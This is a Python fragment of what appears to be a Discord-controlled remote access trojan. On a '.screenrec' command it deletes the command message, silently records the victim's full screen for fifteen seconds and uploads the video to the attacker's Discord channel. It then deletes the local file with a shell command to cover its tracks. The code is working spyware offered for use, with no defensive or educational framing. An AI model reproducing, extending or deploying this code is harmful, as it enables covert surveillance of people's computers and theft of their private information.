import pyautogui
import numpy as np
import subprocess
import time
import imageio

# on message
elif message.content == '.screenrec':
    await message.delete()
    await message.channel.send("`Recording... Please wait.`")

    output_file = f'C:\\Users\\{getuser()}\\{software_directory_name}\\recording.mp4'
    screen_width, screen_height = pyautogui.size()
    screen_region = (0, 0, screen_width, screen_height)
    frames = []

    duration = 15
    fps = 30
    num_frames = duration * fps

    start_time = time.time()

    try:
        for _ in range(num_frames):
            img = pyautogui.screenshot(region=screen_region)
            frame = np.array(img)
            frames.append(frame)

        imageio.mimsave(output_file, frames, fps=fps, quality=8)

        reaction_msg = await message.channel.send("Screen Recording `[On demand]`", file=discord.File(output_file))
        await reaction_msg.add_reaction('📌')
        subprocess.run(f'del {output_file}', shell=True)

    except Exception as e:
        await message.channel.send("An error occurred during screen recording.")
